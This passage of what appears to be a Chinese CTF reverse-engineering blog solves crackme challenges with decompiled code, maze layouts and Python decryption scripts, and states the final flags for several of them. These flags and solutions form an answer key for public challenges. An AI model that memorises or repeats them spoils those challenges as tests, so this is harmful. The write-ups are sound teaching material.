key[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>) &lt; c &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        key[i] += <span class="number">32</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x41</span>, <span class="number">0x80</span>):</span><br><span class="line">        <span class="keyword">if</span> ((f - <span class="number">39</span> - key[i] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(f)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><p>flag{KLDQCUDFZO}</p><h3 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h3><p>主逻辑在main中,根据经验,是一道典型的迷宫题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+17h] [ebp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+30h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+38h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(&amp;v3, _data_start__, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;v4 + i) &lt; <span class="number">0</span> || *(&amp;v4 + i) &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">0x29</span>) == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">0x29</span>) == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>迷宫在_data_start__中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">00402000</span> __data_start__  db   <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                                         ; DATA XREF: _main+<span class="number">25</span>↑o</span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.data:<span class="number">00402000</span>                 db   <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;#&#x27;</span></span><br></pre></td></tr></table></figure><p>因为是小迷宫,手走一遍就可以了:<code>222441144222</code></p><p>即flag:</p><p>flag{222441144222}</p><h3 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h3><p>XJad直接打开</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e2. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://kpdus.tripod.com/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) fieldsfirst ansi space</span></span><br><span class="line"><span class="comment">// Source File Name:   Reverse.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Reverse</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag :&quot;</span>);</span><br><span class="line">        String str = s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is :&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="keyword">char</span> stringArr[] = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span> arr[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ArrayList Resultlist = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> result = arr[i] + <span class="number">64</span> ^ <span class="number">0x20</span>;</span><br><span class="line">            Resultlist.add(Integer.valueOf(result));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> KEY[] = &#123;</span><br><span class="line">            <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>,</span><br><span class="line">            <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span></span><br><span class="line">        &#125;;</span><br><span class="line">        ArrayList KEYList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; KEY.length; j++)</span><br><span class="line">            KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList))</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主逻辑也很简单,将输入加上 <code>64 ^ 0x20</code>,最后对比KEY</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key =  [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>,</span><br><span class="line">            <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] -= <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">    key[i] ^= <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,key)))</span><br></pre></td></tr></table></figure><p>得flag:</p><p>flag{This_is_the_flag_!}</p><h3 id="简单注册机"><a href="#简单注册机" class="headerlink" title="简单注册机"></a>简单注册机</h3><p>用JEB 3打开,发现主要判断如下</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/jdzcj-main.jpg" alt="jdzcj-main"></p><p>这里有两种解法</p><ul><li>直接构造输入<code>4b40000000000000000000000000000000a</code>, <code>0</code>为任意字符,即可让app直接输出flag</li><li>直接用python模拟flag生成流程</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v5 = <span class="built_in">bytearray</span>(<span class="string">b&quot;dd2940c84462b4dd7c450528835cca15&quot;</span>)</span><br><span class="line">v9 = <span class="number">2</span></span><br><span class="line">v2 =<span class="number">1</span></span><br><span class="line">v11 = <span class="number">0x1f</span></span><br><span class="line"></span><br><span class="line">v5[v9] = v5[v9] + v5[<span class="number">31</span>]-<span class="number">50</span></span><br><span class="line">v5[<span class="number">4</span>]= v5[v9] + v5[<span class="number">5</span>]-<span class="number">0x30</span></span><br><span class="line">v5 [<span class="number">30</span>]= v5[v11] + v5[<span class="number">9</span>]- <span class="number">0x30</span></span><br><span class="line">v5[<span class="number">14</span>]= (v5 [<span class="number">27</span>] + v5 [<span class="number">28</span>] - <span class="number">97</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v5[i], v5[<span class="number">0x1f</span> - i] = v5[<span class="number">0x1f</span> - i], v5[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v5)</span><br></pre></td></tr></table></figure><p>得flag</p><p>flag{59acc538825054c7de4b26440c0999dd}</p><ul><li>还是直接构造输入快….</li></ul><h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p>IDA打开发现<code>getflag()</code>函数</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/luck-gay-main.jpg" alt="luck-gay-main"></p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="string">&#x27;fo`guci&#x27;</span>[::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        f2[j] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f2[j] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f1 + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, f2))))</span><br></pre></td></tr></table></figure><p>换一下外包装,得flag:</p><p>flag{do_not_hate_me}</p><h3 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h3><p>换表base64 + 大小写转换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, string</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span>.swapcase()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(s.translate(<span class="built_in">str</span>.maketrans(new_table, old_table))))</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h3><p>简单加解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0</span>, <span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> (i &amp; <span class="number">1</span>) != <span class="number">0</span>:</span><br><span class="line">        flag += <span class="built_in">bytes</span>([data[i] &gt;&gt; i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">bytes</span>([data[i] // i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p>简单加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line"></span><br><span class="line">xor_data = [<span class="number">0x00000009</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000017</span>, <span class="number">0x00000007</span>, <span class="number">0x00000018</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000010</span>, <span class="number">0x00000003</span>, <span class="number">0x00000011</span>, <span class="number">0x00000020</span>, <span class="number">0x0000001D</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000001E</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000016</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000013</span>, <span class="number">0x00000014</span>, <span class="number">0x00000015</span>, <span class="number">0x00000002</span>, <span class="number">0x00000019</span>, <span class="number">0x00000005</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000008</span>, <span class="number">0x00000012</span>, <span class="number">0x0000001A</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    flag[xor_data[i]] = data[i] ^ xor_data[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h3><p>题目描述找邮箱，全局搜索mail, 找到<code>MailTask</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930114853781.png" alt="image-20210930114853781"></p><p>查看<code>sendMailByJavaMail</code>, 可知发送目标地址为<code>mailto</code>, 即第一个参数</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930115102226.png" alt="image-20210930115102226"></p><p>跟随<code>C2.MAILSERVER</code>, 可知调用的是native方法</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930115141903.png" alt="image-20210930115141903"></p><p>解压, base64解码<code>MTgyMTg0NjUxMjVAMTYzLmNvbQ==</code>得flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930115208041.png" alt="image-20210930115208041"></p><h3 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h3><p>upx直接脱壳即可</p><p>在汇编中看到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210930120143179.png" alt="image-20210930120143179"></p><h3 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h3><p>解壳后走个8 * 10迷宫即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00408030                 db &#x27;*******+**&#x27;</span><br><span class="line">.data:0040803A                 db &#x27;******* **&#x27;</span><br><span class="line">.data:00408044                 db &#x27;****    **&#x27;</span><br><span class="line">.data:0040804E                 db &#x27;**   *****&#x27;</span><br><span class="line">.data:00408058                 db &#x27;** **F****&#x27;</span><br><span class="line">.data:00408062                 db &#x27;**    ****&#x27;</span><br><span class="line">.data:0040806C                 db &#x27;**********&#x27;</span><br></pre></td></tr></table></figure><p>flag{ssaaasaassdddw}</p><p>p.s. 由于没有校验，所以直接穿墙过也可以，只要满足步伐13就可以，例如<code>ssaaasaassdwdd</code></p><h3 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( a1[2] - a1[3] == 2225223423LL</span><br><span class="line">   &amp;&amp; a1[3] + a1[4] == 4201428739LL</span><br><span class="line">   &amp;&amp; a1[2] - a1[4] == 1121399208LL</span><br><span class="line">   &amp;&amp; *a1 == -548868226</span><br><span class="line">   &amp;&amp; a1[5] == 0x84F30420</span><br><span class="line">   &amp;&amp; a1[1] == 0x20CAACF4 )</span><br></pre></td></tr></table></figure><p>z3直接解，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[3746099070, 550153460, 3774025685, 1548802262, 2652626477, 2230518816]</span><br></pre></td></tr></table></figure><p>后一个简单加密, 最终脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">x = [Int(<span class="string">&#x27;x%d&#x27;</span> % i)  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">2</span>] - x[<span class="number">3</span>] == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>] + x[<span class="number">4</span>] == <span class="number">4201428739</span>)</span><br><span class="line">s.add(x[<span class="number">2</span>] - x[<span class="number">4</span>] == <span class="number">1121399208</span>)</span><br><span class="line">s.add(x[<span class="number">0</span>] == <span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(x[<span class="number">5</span>] == <span class="number">0x84F30420</span>)</span><br><span class="line">s.add(x[<span class="number">1</span>] == <span class="number">0x20CAACF4</span>)</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        data.append(m[x[i]].as_long())</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>, <span class="number">2</span>):</span><br><span class="line">    v3 = data[i]</span><br><span class="line">    v4 = data[i+<span class="number">1</span>]</span><br><span class="line">    v5 = <span class="number">0x458BCD42</span> * <span class="number">0x40</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3f</span> + <span class="number">1</span>):</span><br><span class="line">        v4 -= (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + key[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + key[<span class="number">3</span>]) ^ <span class="number">0x10</span></span><br><span class="line">        v4 &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        v3 -= (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + key[<span class="number">0</span>]) ^ ((v4 &gt;&gt; <span class="number">9</span>) + key[<span class="number">1</span>]) ^ <span class="number">0x20</span></span><br><span class="line">        v3 &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        v5 -= <span class="number">0x458BCD42</span></span><br><span class="line">        v5 &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    data[i] = v3</span><br><span class="line">    data[i+<span class="number">1</span>] = v4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">   flag += long_to_bytes(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h3><p>简单异或加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x4D</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0x58</span>, <span class="number">0x5A</span>, <span class="number">0x3A</span>, <span class="number">0x4A</span>, <span class="number">0x3A</span>, <span class="number">0x60</span>, <span class="number">0x74</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x62</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x7D</span>, <span class="number">0x38</span>, <span class="number">0x67</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([data[i] ^ i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h3><p>简单异或加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [  <span class="number">13</span>,  <span class="number">38</span>,  <span class="number">73</span>,  <span class="number">69</span>,  <span class="number">42</span>,  <span class="number">23</span>, <span class="number">120</span>,  <span class="number">68</span>,  <span class="number">43</span>, <span class="number">108</span>, </span><br><span class="line">   <span class="number">93</span>,  <span class="number">94</span>,  <span class="number">69</span>,  <span class="number">18</span>,  <span class="number">47</span>,  <span class="number">23</span>,  <span class="number">43</span>,  <span class="number">68</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">86</span>,   <span class="number">9</span>,  <span class="number">95</span>,  <span class="number">69</span>,  <span class="number">71</span>, <span class="number">115</span>,  <span class="number">38</span>,  <span class="number">10</span>,  <span class="number">13</span>,  <span class="number">19</span>, </span><br><span class="line">   <span 